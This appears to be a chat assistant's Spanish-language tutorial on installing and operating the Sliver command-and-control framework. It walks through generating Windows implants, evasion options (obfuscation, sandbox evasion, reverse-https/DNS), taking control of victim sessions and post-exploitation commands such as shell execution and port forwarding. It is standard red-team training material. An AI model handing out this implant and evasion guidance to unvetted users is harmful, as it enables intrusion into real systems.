

> Sliver es un framework de Command & Control (C2) moderno, desarrollado por BishopFox. Es una alternativa libre y de código abierto a herramientas como Cobalt Strike, y se utiliza en ejercicios de Red Team, pentesting avanzado y simulaciones de APT.

---

## 🔧 Requisitos

- Sistema operativo: Kali Linux, Debian 12 o cualquier Linux moderno
    
- Golang instalado (recomendado: v1.20+)
    
- Conexión a Internet
    

---

## 🚀 Instalación de Sliver

```bash
# 1. Clonar el repositorio
sudo git clone https://github.com/BishopFox/sliver.git /opt/sliver

# 2. Ir al directorio
cd /opt/sliver

# 3. Compilar el servidor
make build

# 4. Hacer accesible el binario
sudo ln -s /opt/sliver/sliver-server /usr/local/bin/sliver-server
sudo ln -s /opt/sliver/sliver-client /usr/local/bin/sliver-client
```

---

## 📂 Estructura del Framework

- `sliver-server`: Componente del lado del atacante (C2 Server)
    
- `sliver-client`: Cliente CLI para interactuar con el servidor
    
- Implants/agents: Ejecutables generados para infectar objetivos
    

---

## 🤖 Ejecución del Servidor

```bash
sliver-server
```

Esto iniciará el servidor Sliver. Si es la primera vez, se generarán claves TLS y configuraciones.

---

## 🚪 Uso del Cliente

En otra terminal:

```bash
sliver-client
```

Aparecerá un prompt interactivo como:

```bash
sliver >
```

---

## 🚩 Generar Payload (Implant)

Ejemplo para Windows:

```bash
generate --os windows --arch amd64 --format exe --sleep 5s --name andre
```

Esto genera un payload `andre.exe` en la carpeta `./sliver/builds`.

Puedes también usar formatos como `--format shellcode`, `--format service`, `--http`, etc.

---

## 🚫 Evasiones y OpSec

Sliver permite:

- Ofuscación
    
- Randomización de nombres de funciones
    
- Cifrado TLS
    
- Soporte para mTLS y DNS over HTTPS
    
- Payloads con `--reflective`, `--syscall` y `--sandbox-evasion`
    

---

## 🚀 Ejecución y Callback

Una vez que el payload se ejecuta en el host víctima:

```bash
[*] Session andre (192.168.1.X) active
```

Puedes tomar el control con:

```bash
sliver > sessions
sliver > interact <ID>
```

---

## 🤜 Comandos útiles dentro de la sesión

```bash
info
ps
upload /tmp/tool.exe
shell whoami
portfwd add -l 4444 -r 127.0.0.1 -p 3389
```

---

## 🎓 Automatización con Scripts

Puedes escribir scripts en Go y cargarlos con:

```bash
sliver > script load ./script.go
```

---

## 📝 Logs y Auditoría

Los logs se almacenan en:

```
~/.sliver/
```

Incluyen los registros del cliente, configuración, claves y sesiones.

---

## 🔄 Actualizar Sliver

```bash
cd /opt/sliver
git pull
make build
```

---

## 💡 Consejos

- Usa Sliver en laboratorios controlados
    
- Cambia el dominio TLS default
    
- Usa `reverse-https` o `reverse-dns` para mejor evasión
    
- Integra con C2-Bridge, redirectores o CDNs
    

---

✅ **Sliver es poderoso pero requiere responsabilidad.** Únicamente para uso ético, profesional y con autorización.

---

¿Seguimos con **Impacket** ahora?